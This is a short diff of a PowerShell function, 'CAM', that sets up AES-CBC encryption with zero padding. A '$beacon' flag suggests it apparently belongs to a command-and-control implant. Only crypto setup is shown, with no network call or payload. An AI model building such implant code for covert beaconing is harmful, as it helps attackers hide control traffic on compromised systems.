@@ -1,10 +1,7 @@
 $beacon=1
 function CAM ($key,$IV){
-try {
-try{$a = New-Object "System.Security.Cryptography.RijndaelManaged"
-}
-catch{}
-} catch {$a = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"}
+
+$a = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"
 $a.Mode = [System.Security.Cryptography.CipherMode]::CBC
 $a.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
 $a.BlockSize = 128
